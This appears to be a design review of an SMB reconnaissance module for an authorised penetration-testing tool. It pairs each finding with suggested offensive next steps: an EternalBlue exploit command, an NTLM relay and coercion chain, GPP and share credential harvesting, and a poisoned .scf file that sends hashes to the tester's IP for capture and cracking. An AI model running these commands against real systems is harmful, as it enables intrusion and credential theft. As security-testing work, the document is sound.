summary: SMB module is credential-free + credentialed hybrid: stdlib SMB2/SMB1 NEGOTIATE probe fingerprints dialect and signing posture (T1 safe verify), pulls NTLM CHALLENGE for pre-auth info disclosure (T1), and enumerates via nxc/smbclient. Writable share detection actually PROVES write with a reversible drop-list-delete (T2). No secretsdump/relay execution here (per user directive - T3 stays as tester_next_step). Biggest gap: it never runs the actual MS17-010 vuln check itself (only points to nmap), and it never harvests LAPS/GPP passwords from spidered shares.

findings.tier_evidence: SMBv1 NEGOTIATE returned a selected dialect - direct wire observation that legacy proto is enabled, but does NOT prove MS17-010 exploitability.
findings.promotion_notes: Add an inline SMB_COM_TRANSACTION2 SECONDARY probe (the ms17-010 nse check) that reads STATUS_INSUFF_SERVER_RESOURCES vs STATUS_INVALID_HANDLE to distinguish patched vs vulnerable. Non-destructive, mirrors nmap smb-vuln-ms17-010.
findings.tester_next_step: nmap --script smb-vuln-ms17-010 -p445 <ip>. If VULNERABLE: msf use exploit/windows/smb/ms17_010_eternalblue set RHOSTS <ip>; LHOST <you>; check first, exploit only in ROE.

findings.title_pattern: SMB signing not required (NTLM relay target)
findings.tier_evidence: SecurityMode SIGN_REQUIRED bit read directly from an SMB2 NEGOTIATE reply - deterministic proof this host is a viable NTLM relay target.
findings.promotion_notes: Chain a coercion source from msrpc (PetitPotam/PrinterBug/DFSCoerce) + ntlmrelayx -t smb://<ip> -smb2support --socks. recce would need known_relay_targets shared surface consumed by msrpc's coercion finding to auto-suggest the full chain.
findings.tester_next_step: impacket-ntlmrelayx.py -t smb://<ip> -smb2support -socks & then Coercer coerce -u <lowpriv> -p <pass> -t <victim-dc> -l <your-ip>. On success socks proxies psexec/secretsdump through the relay.

findings.title_pattern: SMB pre-auth NTLM CHALLENGE leaks host/domain intel
findings.tier_evidence: One extra NEGOTIATE+SESSION_SETUP round trip parses NTLMSSP CHALLENGE AV_PAIRs - pre-auth harvest of NetBIOS/DNS/AD domain/forest/OS build/server clock, deterministic and non-destructive.
findings.promotion_notes: Already at its ceiling - info leak is its purpose. Value lives in feeding known_hostnames/known_domains/kerberos_skew across modules; make sure kerberos.kdc_probe/skew and ldap kerberos_realm both consume this.
findings.tester_next_step: nxc smb <ip> - the banner prints the same fields; then feed dns_domain into kerberos, and os_version into a CVE map (searchsploit windows <build>).

findings.title_pattern: SMB null / anonymous session allows enumeration
findings.tier_evidence: nxc actually authenticated with empty creds and enumerated shares+users - the null session was USED, not just probed. Confirmed anonymous logon with data returned.
findings.promotion_notes: Add spider_shares invocation on the enumerated share list to pull actual sensitive files (GPP cpassword, unattend.xml). flag_secret_files already exists and is unit-testable - wire it into cmd_smb so a null-session run auto-hunts secrets.
findings.tester_next_step: enum4linux-ng -A <ip>; then rpcclient -U '' -N <ip> and run: lsaenumsid, lookupnames, samrdump. For GPP: nxc smb <ip> -u '' -p '' -M gpp_password.

findings.tier_evidence: nxc reports READ ACL on non-admin shares that anonymous can actually reach - the read capability is confirmed by the enum session, not inferred.
findings.promotion_notes: Auto-run spider_shares on each anon-readable share (already implemented) and emit the 'Sensitive files readable' finding as part of the default anonymous flow, not a manual follow-up. Would land actual credentials (GPP, unattend, .kdbx, id_rsa).
findings.tester_next_step: smbclient //<ip>/<share> -N -c 'recurse; ls'; then smbget -R smb://<ip>/<share>. Grep for password, cpassword, connectionstring. gpp-decrypt any cpassword=... hits.

findings.tier_evidence: prove_writable actually puts a marker file, lists it, and deletes it - the write is proven with a controlled payload (reversible canary). This IS proof-of-exploit for the write primitive.
findings.promotion_notes: Would need to drop a poisoned .scf/.url and stand up a Responder listener to capture NetNTLM from any browser hit. Not appropriate for automatic execution - stays as tester_next_step per user directive.
findings.tester_next_step:
smbclient //<ip>/<share> -N -c 'put @poisoned.scf; ls'. Content: [Shell]
Command=2
IconFile=\<your-ip>\pwn.ico
[Taskbar]
Command=ToggleDesktop. Then responder -I <iface> -A. Capture the NetNTLMv2 -> hashcat -m 5600 -> reuse or relay.

proposed_shared_surface_consumers: known_relay_targets (produce - consumed by msrpc coercion + adcs relay)
